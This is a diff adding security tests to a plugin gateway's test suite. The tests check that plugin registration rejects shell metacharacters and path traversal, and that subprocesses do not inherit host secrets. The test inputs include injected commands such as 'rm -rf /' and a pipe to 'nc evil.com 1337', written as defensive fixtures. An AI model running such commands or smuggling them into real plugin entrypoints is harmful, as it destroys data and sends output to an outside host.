@@ -10,7 +10,7 @@ import io
 import json
 import zipfile
 from pathlib import Path
-from unittest.mock import AsyncMock, patch
+from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 from sqlmodel import Session, select
@@ -397,3 +397,84 @@ def test_registry_scan_skips_disabled_and_broken(db_session: Session, tmp_path: 
     # Only active_plug loaded; disabled_plug skipped, corrupt_plug ignored
     assert len(loaded) == 1
     assert loaded[0].id == "active_plug"
+
+
+def test_plugin_request_command_injection_validation():
+    """RegisterPluginRequest and UpdatePluginConfigRequest reject shell metacharacters and path traversal in IDs."""
+    from pydantic import ValidationError
+
+    from core.gateway.schemas import RegisterPluginRequest, UpdatePluginConfigRequest
+
+    # 1. Shell metacharacters in entrypoint
+    with pytest.raises(ValidationError, match="forbidden shell metacharacters"):
+        RegisterPluginRequest(
+            id="valid_id",
+            name="Test",
+            driver="pyodbc",
+            entrypoint="python adapter.py & calc.exe",
+        )
+
+    with pytest.raises(ValidationError, match="forbidden shell metacharacters"):
+        RegisterPluginRequest(
+            id="valid_id",
+            name="Test",
+            driver="pyodbc",
+            entrypoint="python adapter.py; rm -rf /",
+        )
+
+    # 2. Path traversal in plugin ID
+    with pytest.raises(ValidationError, match="Plugin ID must only contain alphanumeric"):
+        RegisterPluginRequest(
+            id="../../evil_plug",
+            name="Test",
+            driver="pyodbc",
+            entrypoint="python adapter.py",
+        )
+
+    # 3. Shell metacharacters in UpdatePluginConfigRequest
+    with pytest.raises(ValidationError, match="forbidden shell metacharacters"):
+        UpdatePluginConfigRequest(
+            config={},
+            entrypoint="python adapter.py | nc evil.com 1337",
+        )
+
+
+@pytest.mark.asyncio
+async def test_plugin_worker_environment_sanitization_and_no_shell(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
+    """_PersistentWorker does not leak sensitive host environment variables to plugin subprocess."""
+    from core.engine.plugin_client import _PersistentWorker
+
+    # Inject mock host secrets into os.environ
+    monkeypatch.setenv("DATABASE_PASSWORD", "SuperSecretDbPassword123")
+    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "AKIAIOSFODNN7EXAMPLE")
+    monkeypatch.setenv("AEGISGATE_ADMIN_TOKEN", "jwt_token_secret_value")
+
+    worker = _PersistentWorker(cmd="python nonexistent_safe_cmd.py", working_dir=str(tmp_path))
+
+    # Verify that spawning prepares a sanitized sub_env without host secrets
+    captured_kwargs = {}
+
+    async def mock_create_subprocess_exec(*args, **kwargs):
+        nonlocal captured_kwargs
+        captured_kwargs = kwargs
+        # Simulate clean launch returning mock process
+        mock_proc = AsyncMock()
+        mock_proc.pid = 99999
+        mock_proc.stdout = AsyncMock()
+        mock_proc.stderr = AsyncMock()
+        mock_proc.kill = MagicMock()
+        mock_proc.returncode = None
+        return mock_proc
+
+    with (
+        patch("asyncio.create_subprocess_exec", side_effect=mock_create_subprocess_exec),
+        patch("core.engine.plugin_client._PersistentWorker._read_loop"),
+        patch("core.engine.plugin_client._PersistentWorker._drain_stderr"),
+    ):
+        await worker._spawn()
+
+    env = captured_kwargs.get("env", {})
+    assert "DATABASE_PASSWORD" not in env
+    assert "AWS_SECRET_ACCESS_KEY" not in env
+    assert "AEGISGATE_ADMIN_TOKEN" not in env
+    assert env.get("PYTHONUNBUFFERED") == "1"
